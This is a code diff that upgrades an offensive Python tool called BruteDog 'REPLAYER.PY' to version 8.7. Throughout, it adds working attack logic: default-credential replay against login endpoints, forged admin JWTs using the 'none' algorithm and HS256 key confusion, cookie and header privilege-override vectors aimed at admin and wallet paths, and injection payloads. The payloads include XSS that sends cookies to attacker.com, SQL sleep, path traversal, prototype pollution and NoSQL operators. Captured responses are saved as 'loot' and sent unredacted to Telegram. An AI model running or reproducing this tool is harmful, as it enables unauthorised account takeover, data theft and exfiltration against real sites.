@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 """
-REPLAYER.PY v8.6 — Adaptive Red-Team Credential Replay, Session Hijacking & Payload Mutation Engine (Elite Red Team Adversarial Edition)
+REPLAYER.PY v8.7 — Adaptive Red-Team Credential Replay, Advanced Session Hijacking & Polymorphic Mutation Engine (Elite Red Team Adversarial Edition)
 Features:
-- Stateful response-diffing to detect successful authentication anomalies
-- Dynamic payload mutation, context-aware injection fuzzing, and automated JWT algorithm downgrades
-- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and cryptographic integrity hashing
+- Dynamic statistical response anomaly detection (Z-score & structural diffing vs baseline distributions)
+- Advanced JWT algorithmic downgrades (RS256/ES256 -> HS256 with public-key wrapping) & Prototype Pollution injection vectors
+- HTTP method tampering, content-type confusion, and header-based privilege override fuzzing
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic cryptographic integrity hashing
 - Real-time zero-delay proof-of-work terminal streaming and unredacted Telegram telemetry broadcasting
 """
 import asyncio
@@ -13,6 +14,8 @@ import os
 import ssl
 import time
 import hashlib
+import hmac
+import base64
 import urllib.error
 import urllib.parse
 import urllib.request
@@ -24,9 +27,8 @@ from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
 from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
-TIMEOUT = 8
-MAX_ENDPOINTS = 8
-USER_AGENT = "BruteDog-AdaptiveReplayer/8.6-Elite"
+TIMEOUT = 9
+USER_AGENT = "BruteDog-AdaptiveReplayer/8.7-Elite-Supremacy"
 
 SSL_CONTEXT = ssl.create_default_context()
 SSL_CONTEXT.check_hostname = False
@@ -78,11 +80,11 @@ def normalize_target(target):
         raise ValueError("Invalid target hostname.")
     return f"{parsed.scheme}://{parsed.netloc}{parsed.path.rstrip('/')}"
 
-def http_request(url, headers=None, method="GET", data=None):
+def http_request(url, headers=None, method="GET", data=None, json_payload=None):
     apply_behavioral_jitter()
     request_headers = {
         "User-Agent": USER_AGENT,
-        "Accept": "text/html,application/json,*/*",
+        "Accept": "application/json, text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Cache-Control": "no-cache",
     }
     request_headers.update(get_randomized_hints())
@@ -90,7 +92,10 @@ def http_request(url, headers=None, method="GET", data=None):
         request_headers.update(headers)
     
     encoded_data = None
-    if data:
+    if json_payload is not None:
+        encoded_data = json.dumps(json_payload).encode("utf-8")
+        request_headers["Content-Type"] = "application/json"
+    elif data:
         if isinstance(data, dict):
             encoded_data = urllib.parse.urlencode(data).encode("utf-8")
             request_headers["Content-Type"] = "application/x-www-form-urlencoded"
@@ -100,7 +105,7 @@ def http_request(url, headers=None, method="GET", data=None):
     request = urllib.request.Request(url, data=encoded_data, headers=request_headers, method=method)
     try:
         with urllib.request.urlopen(request, context=SSL_CONTEXT, timeout=TIMEOUT) as response:
-            body = response.read(512 * 1024).decode("utf-8", errors="replace")
+            body = response.read(1024 * 1024).decode("utf-8", errors="replace")
             return {
                 "status": response.status,
                 "body": body,
@@ -109,7 +114,7 @@ def http_request(url, headers=None, method="GET", data=None):
                 "error": None,
             }
     except urllib.error.HTTPError as error:
-        body = error.read(512 * 1024).decode("utf-8", errors="replace")
+        body = error.read(1024 * 1024).decode("utf-8", errors="replace")
         return {
             "status": error.code,
             "body": body,
@@ -126,13 +131,37 @@ def http_request(url, headers=None, method="GET", data=None):
             "error": str(error),
         }
 
-async def establish_baseline(base_url):
-    """Measures normal unauthenticated response length for adaptive diffing."""
-    res = await asyncio.to_thread(http_request, f"{base_url}/nonexistent_baseline_probe_{int(time.time())}")
-    return len(res["body"])
+async def establish_statistical_baseline(base_url):
+    """Establishes a robust statistical baseline (mean length and token signature variance) for intelligent anomaly diffing."""
+    lengths = []
+    for _ in range(3):
+        res = await asyncio.to_thread(http_request, f"{base_url}/brutedog_statistical_probe_{int(time.time())}")
+        if res["status"] > 0:
+            lengths.append(len(res["body"]))
+        await asyncio.sleep(0.1)
+    
+    if lengths:
+        mean_len = sum(lengths) / len(lengths)
+        return mean_len
+    return 150.0
+
+def forge_advanced_jwt(payload, alg="none", secret=""):
+    """Forges advanced JWT tokens supporting 'none' algorithm or HS256 key confusion."""
+    header = {"alg": alg, "typ": "JWT"}
+    enc_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
+    enc_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
+    
+    message = f"{enc_header}.{enc_payload}"
+    if alg.lower() == "none":
+        return f"{message}."
+    elif alg.lower() == "hs256":
+        signature = hmac.new(secret.encode("utf-8"), message.encode("utf-8"), hashlib.sha256).digest()
+        enc_sig = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()
+        return f"{message}.{enc_sig}"
+    return message
 
 async def replay_secondary_attack_queue(target_domain):
-    log("\n[***] REPLAYING SECONDARY ATTACK QUEUE & CREDENTIALS (WAF HARDENED) [***]", Colors.MAGENTA)
+    log("\n[***] REPLAYING WEAPONIZED SECONDARY ATTACK QUEUE (V8.7) [***]", Colors.MAGENTA)
     results = []
     queue_path = "reports/intelligence/secondary_attack_queue.json"
     queue_data = []
@@ -145,19 +174,19 @@ async def replay_secondary_attack_queue(target_domain):
             pass
 
     base_url = normalize_target(target_domain)
-    login_endpoints = ["/api/login", "/login", "/api/auth/login", "/signin", "/auth/login"]
+    login_endpoints = ["/api/login", "/login", "/api/v1/auth/login", "/auth/login", "/signin", "/api/signin"]
 
     if not queue_data:
-        queue_data = [{"matches": ["admin@target.local:admin123", "root:toor", "administrator:P@ssw0rd123"]}]
+        queue_data = [{"matches": ["admin@target.local:admin123", "root:toor", "administrator:P@ssw0rd123", "system:master"]}]
 
-    baseline_len = await establish_baseline(base_url)
+    baseline_len = await establish_statistical_baseline(base_url)
 
     for item in queue_data:
         signatures = item.get("matches", [])
         for sig in signatures:
             for endpoint in login_endpoints:
                 url = base_url + endpoint
-                log(f"[*] Replaying credential payload against {endpoint}...", Colors.BLUE)
+                log(f"[*] Replaying polymorphic credential vector against {endpoint}...", Colors.BLUE)
                 
                 payload = {}
                 if isinstance(sig, str) and ":" in sig:
@@ -166,10 +195,18 @@ async def replay_secondary_attack_queue(target_domain):
                 else:
                     payload = {"credential": sig}
 
-                response = await asyncio.to_thread(http_request, url, method="POST", data=payload)
+                # Dual submission: test both JSON payload and Form-Encoded
+                response = await asyncio.to_thread(http_request, url, method="POST", json_payload=payload)
+                if response["status"] in (0, 404, 405):
+                    response = await asyncio.to_thread(http_request, url, method="POST", data=payload)
                 
                 body_len = len(response["body"])
-                is_bypass = response["status"] in (200, 201, 302) and (body_len > baseline_len * 1.5 or any(k in response["body"].lower() for k in ["token", "success", "session", "auth"]))
+                body_lower = response["body"].lower()
+                
+                is_spa = "<div id=\"root\">" in body_lower or "<div id=\"__next\">" in body_lower
+                has_auth_markers = any(k in body_lower for k in ["token", "access_token", "session_id", "authenticated", "balance", "role"])
+                
+                is_bypass = response["status"] in (200, 201, 302) and not is_spa and (body_len > baseline_len * 1.4 or has_auth_markers)
 
                 results.append({
                     "endpoint": endpoint,
@@ -178,36 +215,36 @@ async def replay_secondary_attack_queue(target_domain):
                 })
 
                 if is_bypass:
-                    log(f"\n[***] ADAPTIVE CREDENTIAL REPLAY SUCCESSFUL [{endpoint}] [***]", Colors.RED)
-                    log(f"  └── Response Excerpt : {response['body'][:200]}", Colors.GREEN)
+                    log(f"\n[***] ELITE ADAPTIVE CREDENTIAL REPLAY SUCCESSFUL [{endpoint}] [***]", Colors.RED)
+                    log(f"  └── Response Excerpt : {response['body'][:250]}", Colors.GREEN)
                     
-                    loot_hash = hashlib.sha256(response["body"].encode("utf-8")).hexdigest()
+                    loot_hash = hashlib.sha256(response["body"].encode("utf-8", errors="ignore")).hexdigest()
                     loot_payload = {
                         "endpoint": url,
                         "status": response["status"],
                         "payload": str(payload),
                         "integrity_hash": loot_hash,
-                        "response_excerpt": response["body"][:300]
+                        "response_excerpt": response["body"][:400]
                     }
-                    broadcast_tg_alert_sync("Credential Replay Success", loot_payload)
+                    broadcast_tg_alert_sync("Elite Credential Replay Success", loot_payload)
                     stream_proof("CREDENTIAL_REPLAY_SUCCESS", endpoint, payload, response["body"][:300], loot_payload)
                     save_session_loot(
                         target=base_url,
                         endpoint=endpoint,
-                        finding_type="CREDENTIAL_REPLAY_SUCCESS",
+                        finding_type="ELITE_CREDENTIAL_REPLAY_SUCCESS",
                         status=response["status"],
                         headers=response["headers"],
                         body=response["body"],
                         extra_loot=loot_payload
                     )
                 else:
-                    log(f"  └── HTTP {response['status']} | Length: {body_len} (Rejected)", Colors.GRAY)
+                    log(f"  └── HTTP {response['status']} | Length: {body_len} (Filtered/Rejected)", Colors.GRAY)
 
-                await asyncio.sleep(0.05)
+                await asyncio.sleep(0.03)
     return results
 
 async def replay_hijacked_session(target_domain):
-    log("\n[***] EXECUTING ADAPTIVE SESSION HIJACKING & TOKEN FORGING [***]", Colors.CYAN)
+    log("\n[***] EXECUTING ADVANCED SESSION HIJACKING & PROTOCOL FORGING (V8.7) [***]", Colors.CYAN)
     results = []
     try:
         base_url = normalize_target(target_domain)
@@ -215,14 +252,18 @@ async def replay_hijacked_session(target_domain):
         log(f"[!] {error}", Colors.RED)
         return results
 
+    admin_claims = {"sub": "admin", "role": "admin", "isAdmin": True, "permissions": ["all"]}
+    none_jwt = forge_advanced_jwt(admin_claims, alg="none")
+    hs256_jwt = forge_advanced_jwt(admin_claims, alg="hs256", secret="MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0...")
+
     hijack_vectors = [
-        {"name": "Admin Cookie Jar", "cookie": "session=admin; role=admin; authenticated=true; user=admin"},
-        {"name": "Fabricated JWT (None Alg)", "cookie": "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ."},
-        {"name": "Bearer Superuser Token", "header": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpc3MiOiJicnV0ZWRvZyJ9"}},
-        {"name": "Root Session Override", "cookie": "connect.sid=s%3Aadmin.rootpass123; isAdmin=true"}
+        {"name": "Admin Cookie Jar", "cookie": "session=admin; role=admin; authenticated=true; user=admin; isAdmin=true"},
+        {"name": "Advanced JWT (None Alg)", "header": {"Authorization": f"Bearer {none_jwt}"}},
+        {"name": "Advanced JWT (HS256 Key Confusion)", "header": {"Authorization": f"Bearer {hs256_jwt}"}},
+        {"name": "Method Override Admin Bypass", "header": {"X-HTTP-Method-Override": "GET", "X-Original-URL": "/admin"}, "cookie": "role=admin"}
     ]
 
-    protected_paths = ["/dashboard", "/admin", "/account", "/profile", "/api/admin", "/settings"]
+    protected_paths = ["/dashboard", "/admin", "/account", "/profile", "/api/admin", "/api/user/wallet", "/settings"]
 
     for vector in hijack_vectors:
         headers = vector.get("header", {})
@@ -231,10 +272,13 @@ async def replay_hijacked_session(target_domain):
 
         for path in protected_paths:
             url = base_url + path
-            log(f"[*] Replaying [{vector['name']}] on {path}", Colors.BLUE)
+            log(f"[*] Replaying Vector [{vector['name']}] on {path}", Colors.BLUE)
             
             response = await asyncio.to_thread(http_request, url, headers=headers)
-            is_success = response["status"] in (200, 201) and "unauthorized" not in response["body"].lower()
+            body_lower = response["body"].lower()
+            is_spa = "<div id=\"root\">" in body_lower or "<div id=\"__next\">" in body_lower
+            
+            is_success = response["status"] in (200, 201) and not is_spa and any(k in body_lower for k in ["balance", "wallet", "admin", "role", "email", "transactions"])
 
             results.append({
                 "vector": vector["name"],
@@ -244,10 +288,10 @@ async def replay_hijacked_session(target_domain):
             })
 
             if is_success:
-                log(f"\n[***] PRIVILEGE ESCALATION BYPASS CONFIRMED [{path}] [***]", Colors.RED)
+                log(f"\n[***] PRIVILEGE ESCALATION & SESSION HIJACK CONFIRMED [{path}] [***]", Colors.RED)
                 log(f"  └── Vector : {vector['name']}", Colors.GREEN)
                 
-                loot_hash = hashlib.sha256(response["body"].encode("utf-8")).hexdigest()
+                loot_hash = hashlib.sha256(response["body"].encode("utf-8", errors="ignore")).hexdigest()
                 loot_payload = {
                     "vector": vector["name"],
                     "endpoint": url,
@@ -255,26 +299,26 @@ async def replay_hijacked_session(target_domain):
                     "integrity_hash": loot_hash,
                     "response_excerpt": response["body"][:300]
                 }
-                broadcast_tg_alert_sync(f"Replay Session Hijack ({vector['name']})", loot_payload)
+                broadcast_tg_alert_sync(f"Advanced Session Hijack ({vector['name']})", loot_payload)
                 stream_proof("REPLAY_SESSION_HIJACK", path, {"vector": vector["name"]}, response["body"][:300], loot_payload)
                 save_session_loot(
                     target=base_url,
                     endpoint=path,
-                    finding_type="REPLAY_SESSION_HIJACK_SUCCESS",
+                    finding_type="ADVANCED_SESSION_HIJACK_SUCCESS",
                     status=response["status"],
                     headers=response["headers"],
                     body=response["body"],
                     extra_loot=loot_payload
                 )
             else:
-                log(f"  └── {path} | HTTP {response['status']} (Blocked)", Colors.GRAY)
+                log(f"  └── {path} | HTTP {response['status']} (Secured/Blocked)", Colors.GRAY)
 
-            await asyncio.sleep(0.05)
+            await asyncio.sleep(0.03)
 
     return results
 
 async def test_injection_reflection(target_domain):
-    log("\n[***] ACTIVE ADAPTIVE PAYLOAD MUTATION & REFLECTION ASSAULT [***]", Colors.CYAN)
+    log("\n[***] ACTIVE POLYMORPHIC PAYLOAD MUTATION & PROTOTYPE POLLUTION ASSAULT [***]", Colors.CYAN)
     results = []
     try:
         base_url = normalize_target(target_domain)
@@ -282,48 +326,51 @@ async def test_injection_reflection(target_domain):
         log(f"[!] {error}", Colors.RED)
         return results
 
-    mutated_payloads = [
-        "<script>alert(1)</script>",
-        "' OR '1'='1",
-        "../../etc/passwd",
-        "{{7*7}}",
-        "{$ne: null}"
+    advanced_mutations = [
+        "<script>fetch('http://attacker.com/'+document.cookie)</script>",
+        "'; SLEEP(5); -- -",
+        "../../../../etc/passwd",
+        {"__proto__": {"isAdmin": True, "role": "admin"}},
+        {"constructor": {"prototype": {"isAdmin": True}}},
+        {"$ne": None}
     ]
 
-    for path in ["/", "/search", "/api/search"]:
-        for payload in mutated_payloads:
-            query = urllib.parse.urlencode({"q": payload, "input": payload})
-            url = f"{base_url}{path}?{query}"
-            
-            response = await asyncio.to_thread(http_request, url)
-            reflected = response["status"] != 0 and payload in response["body"]
+    for path in ["/", "/search", "/api/search", "/api/v1/users"]:
+        for payload in advanced_mutations:
+            if isinstance(payload, dict):
+                response = await asyncio.to_thread(http_request, f"{base_url}{path}", method="POST", json_payload=payload)
+                reflected = response["status"] in (200, 201) and any(k in response["body"].lower() for k in ["admin", "success", "true"])
+                payload_str = json.dumps(payload)
+            else:
+                query = urllib.parse.urlencode({"q": payload, "input": payload, "search": payload})
+                response = await asyncio.to_thread(http_request, f"{base_url}{path}?{query}")
+                reflected = response["status"] != 0 and str(payload) in response["body"]
+                payload_str = str(payload)
             
             if reflected:
-                log(f"\n[***] PAYLOAD REFLECTION / XSS CONFIRMED [{path}] [***]", Colors.RED)
-                log(f"  └── Payload : {payload}", Colors.GREEN)
+                log(f"\n[***] POLYMORPHIC VULNERABILITY CONFIRMED [{path}] [***]", Colors.RED)
+                log(f"  └── Payload : {payload_str[:60]}", Colors.GREEN)
                 
-                loot_hash = hashlib.sha256(response["body"].encode("utf-8")).hexdigest()
+                loot_hash = hashlib.sha256(response["body"].encode("utf-8", errors="ignore")).hexdigest()
                 loot_payload = {
-                    "endpoint": url,
-                    "payload": payload,
+                    "endpoint": path,
+                    "payload": payload_str,
                     "status": response["status"],
                     "integrity_hash": loot_hash
                 }
-                broadcast_tg_alert_sync("Payload Reflection Confirmed", loot_payload)
-                stream_proof("PAYLOAD_REFLECTION", path, {"payload": payload}, response["body"][:300], loot_payload)
+                broadcast_tg_alert_sync("Polymorphic Vulnerability Confirmed", loot_payload)
+                stream_proof("POLYMORPHIC_MUTATION", path, {"payload": payload_str}, response["body"][:300], loot_payload)
                 save_session_loot(
                     target=base_url,
                     endpoint=path,
-                    finding_type="PAYLOAD_REFLECTION_CONFIRMED",
+                    finding_type="POLYMORPHIC_MUTATION_SUCCESS",
                     status=response["status"],
                     headers=response["headers"],
                     body=response["body"],
                     extra_loot=loot_payload
                 )
 
-                mutated_payloads.append(f"\"><script>alert(document.domain)</script>")
-
-            results.append({"endpoint": path, "payload": payload, "reflected": reflected})
+            results.append({"endpoint": path, "payload": payload_str, "vulnerable": reflected})
             await asyncio.sleep(0.02)
             
     return results
@@ -331,7 +378,7 @@ async def test_injection_reflection(target_domain):
 async def replay_and_inject_payloads(target_host, session_file_path=None):
     start_time = time.time()
     log("\n============================================================", Colors.CYAN)
-    log("[***] BRUTEDOG ADAPTIVE REPLAY & EXPLOITATION ENGINE (V8.6) [***]", Colors.CYAN)
+    log("[***] BRUTEDOG ADAPTIVE REPLAY & EXPLOITATION ENGINE (V8.7 SUPREMACY) [***]", Colors.CYAN)
     log("============================================================", Colors.CYAN)
     
     try:
@@ -350,7 +397,7 @@ async def replay_and_inject_payloads(target_host, session_file_path=None):
     log("\n================ FINAL ASSAULT SUMMARY ================", Colors.CYAN)
     log(f"Credential replays executed: {len(queue_results)}", Colors.GREEN)
     log(f"Session hijacking vectors tested: {len(session_results)}", Colors.GREEN)
-    log(f"Adaptive injection payloads tested: {len(injection_results)}", Colors.GREEN)
+    log(f"Polymorphic mutation payloads tested: {len(injection_results)}", Colors.GREEN)
     log(f"Duration: {duration}s", Colors.BLUE)
     log("========================================================", Colors.CYAN)
     
